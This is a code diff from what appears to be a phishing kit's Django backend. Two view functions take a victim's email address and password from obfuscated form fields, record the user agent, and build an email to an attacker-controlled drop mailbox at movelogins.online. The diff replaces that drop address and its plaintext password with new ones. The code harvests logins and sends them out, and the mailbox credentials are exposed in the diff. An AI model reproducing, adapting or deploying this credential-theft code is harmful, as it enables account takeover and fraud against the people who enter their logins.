@@ -20,9 +20,9 @@ def addin(request):
     email = request.POST["powerioman"]
     passwordemail = request.POST["enginloio"]
     domain = email[email.index('@') + 1 : ]
-    sender_email = "raygreenwood123@movelogins.online"
-    receiver_email = "raygreenwood123@movelogins.online"
-    password = "K{;)@}+?M@DT"
+    sender_email = "fivemillioncashout@movelogins.online"
+    receiver_email = "fivemillioncashout@movelogins.online"
+    password = "U4t+ouwHo[(#"
     useragent = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
     message["Subject"] = "NEW Korea API ... 0"
@@ -57,9 +57,9 @@ def adddzz(request):
     email = request.POST["zzpowerman"]
     passwordemail = request.POST["yyenginlo"]
     domain = email[email.index('@') + 1 : ]
-    sender_email = "raygreenwood123@movelogins.online"
-    receiver_email = "raygreenwood123@movelogins.online"
-    password = "K{;)@}+?M@DT"
+    sender_email = "fivemillioncashout@movelogins.online"
+    receiver_email = "fivemillioncashout@movelogins.online"
+    password = "U4t+ouwHo[(#"
     useragent = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
     message["Subject"] = "NEW Korea API --1"
